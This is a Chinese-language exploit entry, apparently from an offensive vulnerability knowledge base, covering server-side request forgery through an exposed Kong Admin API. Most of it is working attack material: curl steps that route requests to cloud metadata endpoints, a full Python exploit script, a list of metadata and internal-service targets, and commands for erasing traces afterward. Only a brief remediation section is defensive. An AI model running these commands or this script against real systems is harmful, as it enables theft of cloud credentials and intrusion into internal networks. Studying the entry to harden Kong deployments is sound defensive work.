---
id: KONG-ADMIN-SSRF
title: "Kong - Admin API SSRF 代理攻击"
product: kong
vendor: Kong Inc
version_affected: "不适用（取决于 Admin API 暴露面，非版本边界）"
severity: CRITICAL
tags: [ssrf, api_gateway, admin_api, proxy, cloud_metadata, 无需认证]
fingerprint: ["Kong"]
---

## 漏洞描述

当Kong Admin API可访问时，攻击者可创建指向内部服务的Service和Route，利用Kong作为代理发起SSRF请求，访问云元数据API、内部服务等。此攻击依赖Admin API未授权访问（CVE-2020-11710）或已获得Admin API凭据。

## 影响版本

- 无版本边界：Kong 全版本在设计上均允许通过 Admin API 配置上游，是否可利用仅取决于 Admin API 的暴露面（默认 8001/8444 端口）。请针对目标实测确认 Admin API 是否可达，而非按版本筛选。

## 前置条件

- Admin API可访问（未授权或已获得凭据）
- Kong Proxy端口(8000)可达

## 利用步骤

### 利用原理

```
攻击者 → POST /services (创建Service指向内网目标)
  → POST /routes (创建Route绑定Host头)
  → GET http://KONG:8000/foo -H "Host: metadata.local"
  → Kong代理请求到内网目标 → SSRF
```

### 通过curl手动利用

```bash
# 1. 创建Service（指向SSRF目标）
curl -X POST http://TARGET:8001/services \
  -d "name=ssrf" \
  -d "url=http://169.254.169.254"

# 2. 创建Route（绑定Host头）
curl -X POST http://TARGET:8001/routes \
  -d "name=ssrf" \
  -d "hosts[]=metadata.local" \
  -d "paths[]=/foo" \
  -d "service.id=<SERVICE_ID>"

# 3. 通过Kong代理访问SSRF目标
curl http://TARGET:8000/foo/ -H "Host: metadata.local"

# 4. 清理痕迹
curl -X DELETE http://TARGET:8001/routes/ssrf
curl -X DELETE http://TARGET:8001/services/ssrf
```

## Payload

### Python利用脚本

```python
#!/usr/bin/env python3
"""Kong Admin API SSRF代理攻击"""
import requests
import json
import sys
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(admin_url, ssrf_target="http://169.254.169.254"):
    """通过Kong Admin API创建SSRF代理"""
    admin_url = admin_url.rstrip("/")
    session = requests.Session()
    session.verify = False

    # 1. 检测Admin API
    print(f"[*] 检测Kong Admin API: {admin_url}")
    try:
        r = session.get(f"{admin_url}/", timeout=10)
        if "Welcome to kong" not in r.text:
            print(f"[-] 不是Kong Admin API")
            return
        print(f"[+] Kong Admin API可访问 (未授权)")
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return

    # 2. 创建Service (指向SSRF目标)
    print(f"[*] 创建Service指向: {ssrf_target}")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "curl/7.64.1"
    }
    r = session.post(f"{admin_url}/services",
                     data={"name": "ssrf-endpoint", "url": ssrf_target},
                     headers=headers)
    if r.status_code == 201:
        service_id = r.json()["id"]
        print(f"[+] Service创建成功: {service_id}")
    elif "name already exists" in r.text:
        r = session.get(f"{admin_url}/services/ssrf-endpoint")
        service_id = r.json()["id"]
        print(f"[*] Service已存在: {service_id}")
    else:
        print(f"[-] 创建Service失败: {r.text}")
        return

    # 3. 创建Route
    print(f"[*] 创建Route...")
    route_data = {
        "name": "ssrf-endpoint",
        "hosts[]": "metadata.local",
        "paths[]": "/foo",
        "service.id": service_id
    }
    route_str = "&".join(f"{k}={v}" for k, v in route_data.items())
    r = session.post(f"{admin_url}/routes/",
                     data=route_str, headers=headers)
    if r.status_code == 201:
        print(f"[+] Route创建成功")
    elif "name already exists" in r.text:
        print(f"[*] Route已存在")

    # 4. 通过Kong代理访问SSRF目标
    proxy_url = admin_url.replace(":8001", ":8000")
    print(f"\n[*] SSRF测试: {proxy_url}/foo/")
    print(f"[*] 使用curl:")
    print(f'curl {proxy_url}/foo/ -H "Host: metadata.local"')

    r = session.get(f"{proxy_url}/foo/",
                   headers={"Host": "metadata.local"},
                   timeout=15)
    print(f"[+] Status: {r.status_code}")
    print(f"[+] Response:\n{r.text[:3000]}")

    # 5. 清理
    print(f"\n[*] 清理命令:")
    print(f"curl -X DELETE {admin_url}/routes/ssrf-endpoint")
    print(f"curl -X DELETE {admin_url}/services/ssrf-endpoint")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Kong Admin API SSRF")
    parser.add_argument("-u", "--url", required=True, help="Kong Admin API URL")
    parser.add_argument("-s", "--ssrf", default="http://169.254.169.254",
                       help="SSRF目标URL")
    args = parser.parse_args()
    exploit(args.url, args.ssrf)
```

### SSRF常用目标

```
# AWS元数据
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# GCP元数据
http://metadata.google.internal/computeMetadata/v1/
(需Header: Metadata-Flavor: Google)

# Azure元数据
http://169.254.169.254/metadata/instance?api-version=2021-02-01
(需Header: Metadata: true)

# 内部服务
http://kubernetes.default.svc.cluster.local
http://localhost:8080
http://localhost:3000  # Grafana
http://localhost:6379  # Redis
```

## 验证方法

```bash
# 确认Admin API可访问
curl -s http://TARGET:8001/ | grep "Welcome to kong"

# 快速SSRF验证（创建→测试→清理）
curl -X POST http://TARGET:8001/services -d "name=ssrf-test" -d "url=http://169.254.169.254"
SERVICE_ID=$(curl -s http://TARGET:8001/services/ssrf-test | python3 -c "import sys,json;print(json.load(sys.stdin)['id'])")
curl -X POST http://TARGET:8001/routes -d "name=ssrf-test" -d "hosts[]=meta.local" -d "service.id=$SERVICE_ID"
curl http://TARGET:8000/ -H "Host: meta.local"
curl -X DELETE http://TARGET:8001/routes/ssrf-test
curl -X DELETE http://TARGET:8001/services/ssrf-test
```

## 修复建议

- 限制Admin API访问（绑定127.0.0.1、启用RBAC认证）
- 使用网络策略限制Kong出站流量，禁止访问云元数据地址
- 配置Kong的`untrusted_lua`限制内网访问
- 监控Admin API的Service/Route创建操作
